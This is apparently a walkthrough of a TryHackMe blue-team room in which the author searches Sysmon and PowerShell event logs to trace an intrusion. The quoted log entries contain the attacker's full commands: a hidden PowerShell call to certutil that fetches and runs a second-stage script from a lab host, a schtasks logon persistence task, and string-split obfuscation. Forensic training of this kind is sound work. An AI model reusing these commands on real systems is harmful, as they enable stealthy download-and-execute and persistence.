<h1 align="left">CTF Blue Team &nbsp; ·  &nbsp; Log Analysis</h1>

<p align="left">
  <img src="https://img.shields.io/badge/Platform-TryHackMe-24292e?style=flat-square" /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <img src="https://img.shields.io/badge/Difficulty-Easy-24292e?style=flat-square" /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <img src="https://img.shields.io/badge/Completed-2026%2C%20OCT%2020--Oct--29-24292e?style=flat-square" /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <a href="https://github.com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=flat-square&logo=github&color=24292e" alt="Follow Rosana on GitHub" /></a> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=flat-square&logo=linkedin&logoColor=white" alt="Connect on LinkedIn" /></a>
</p> 


<br>
<p><em>Answer the questions below</em></p>
<p>A trusted Windows utility downloaded a second-stage script onto the host. The command that called the utility obscured its name with a wildcard. What is the utility’s full executable name?<br>
<code>certutil.exe</code></p>

```bash
ubuntu@tryhackme:~/Desktop/artifacts$ ls
Microsoft-Windows-Sysmon%4Operational.evtx  PowerShell-Operational.evtx  tools
```

```bash
ubuntu@tryhackme:~/Desktop/artifacts/tools$ evtx_dump ~/Desktop/artifacts/Microsoft-Windows-Sysmon%4Operational.evtx | grep "*"
    <Data Name="CommandLine">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -c "&amp; ((gci C:\Windows\System32\certu*.exe)[0].FullName) -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 $env:TEMP\pipeline-sync.ps1; powershell -ep bypass -f $env:TEMP\pipeline-sync.ps1"</Data>
    <Data Name="ParentCommandLine">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -c "&amp; ((gci C:\Windows\System32\certu*.exe)[0].FullName) -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 $env:TEMP\pipeline-sync.ps1; powershell -ep bypass -f $env:TEMP\pipeline-sync.ps1"</Data>
    <Data Name="ParentCommandLine">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -c "&amp; ((gci C:\Windows\System32\certu*.exe)[0].FullName) -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 $env:TEMP\pipeline-sync.ps1; powershell -ep bypass -f $env:TEMP\pipeline-sync.ps1"</Data>
```

<br>
<p>What full URL did the utility retrieve the second-stage script from?<br>
<code>http://pipeline-cdn.thm:8088/pipeline-sync.ps1</code></p>


```bash
ubuntu@tryhackme:~/Desktop/artifacts/tools$ evtx_dump ~/Desktop/artifacts/Microsoft-Windows-Sysmon%4Operational.evtx | grep -C 16 pipeline-sync.ps1
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>THM-JCOLLINS</Computer>
...
    </Security>
  </System>
  <EventData>
...
    <Data Name="ProcessId">2052</Data>
    <Data Name="Image">C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</Data>
...
    <Data Name="OriginalFileName">PowerShell.EXE</Data>
    <Data Name="CommandLine">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -c "&amp; ((gci C:\Windows\System32\certu*.exe)[0].FullName) -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 $env:TEMP\pipeline-sync.ps1; powershell -ep bypass -f $env:TEMP\pipeline-sync.ps1"</Data>
    <Data Name="CurrentDirectory">C:\Users\j.collins\Downloads\</Data>
    <Data Name="User">THM-JCOLLINS\j.collins</Data>
...
    <Data Name="ParentProcessId">6052</Data>
    <Data Name="ParentImage">C:\Windows\SysWOW64\mshta.exe</Data>
...
  </EventData>
</Event>
...
```

<br>
<p>Which MITRE ATT&CK sub-technique describes the abuse of the Windows scripting host that executed the initial attachment?<br>
<code>T1218.005</code></p>

<img width="1334" height="483" alt="image" src="https://github.com/user-attachments/assets/9f5771d6-b4e9-4fc1-b20d-33e8ca1e36a5" />

<br>
<br>
<br>
<p>Which MITRE ATT&CK sub-technique describes the persistence mechanism the intruder configured?<br>
<code>T1053.005</code></p>

```bash
ubuntu@tryhackme:~/Desktop/artifacts/tools$ evtx_dump ~/Desktop/artifacts/Microsoft-Windows-Sysmon%4Operational.evtx | grep -C 6 create  
    <Data Name="Image">C:\Windows\SysWOW64\schtasks.exe</Data>
...
    <Data Name="Description">Task Scheduler Configuration Tool</Data>
...
    <Data Name="OriginalFileName">schtasks.exe</Data>
    <Data Name="CommandLine">"C:\Windows\system32\schtasks.exe" /create /tn StudioPipelineSync /tr "powershell -nop -w hidden -f C:\Users\j.collins\AppData\Roaming\PipelineSync\pipeline-sync.ps1" /sc onlogon /rl highest /f</Data>
    <Data Name="CurrentDirectory">C:\Users\j.collins\Downloads\</Data>
...
```

```bash
ubuntu@tryhackme:~/Desktop/artifacts/tools$ evtx_dump ~/Desktop/artifacts/PowerShell-Operational.evtx | grep -i pipeline-sync.ps1
    <Data Name="ScriptBlockText">&amp; ((gci C:\Windows\System32\certu*.exe)[0].FullName) -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 $env:TEMP\pipeline-sync.ps1; powershell -ep bypass -f $env:TEMP\pipeline-sync.ps1</Data>
    <Data Name="Path">C:\Users\j.collins\AppData\Local\Temp\pipeline-sync.ps1</Data>
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -f C:\Users\J1B0B~1.COL\AppData\Local\Temp\pipeline-sync.ps1
        Script Name = C:\Users\j.collins\AppData\Local\Temp\pipeline-sync.ps1
```

<img width="1343" height="493" alt="image" src="https://github.com/user-attachments/assets/de15bc8d-4fe0-4d9d-a22e-7c2433d8279b" />

<br>
<br>
<br>
<p>What is the flag?<br>
<code>REDACTED</code></p>


```bash
ubuntu@tryhackme:~/Desktop/artifacts/tools$ evtx_dump ~/Desktop/artifacts/PowerShell-Operational.evtx | grep -C 10 flag         
...
    <Data Name="ScriptBlockText">try { Invoke-WebRequest -Uri (-join('htt','p://pip','el','ine','-cdn.th','m:','808','8/check','in')) -UseBasicParsing -TimeoutSec 3 | Out-Null } catch {}
schtasks /create /tn ('S'+'tu'+'dioPi'+'pe'+'li'+'neSyn'+'c') /tr (-join('pow','e','rshe','l','l -nop',' -','w hi','dden -','f C:\U','se','rs\j','.','collins','\AppDat','a\Roamin','g\Pipeli','neSyn','c\','pi','pelin','e-sync','.p','s','1')) /sc onlogon /rl highest /f
$blob = ('REDACTED'+'REDACTED'+'REDACTED'+'REDACTED'+REDACTED'+'REDACTED'+'REDACTED='+'=')
$flag = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob))
$dir = ($env:TEMP + ('\Pipe'+'lineS'+'ync'))
New-Item $dir -ItemType Directory -Force | Out-Null
Set-Content ($dir + ('\.sy'+'nc-c'+'ach'+'e')) $flag
...
    <Data Name="Path">C:\Users\j.collins\AppData\Local\Temp\pipeline-sync.ps1</Data>
...
```

<img width="1361" height="198" alt="image" src="https://github.com/user-attachments/assets/3430a4e4-1679-4ac0-bfa7-5b8816d76f1b" />

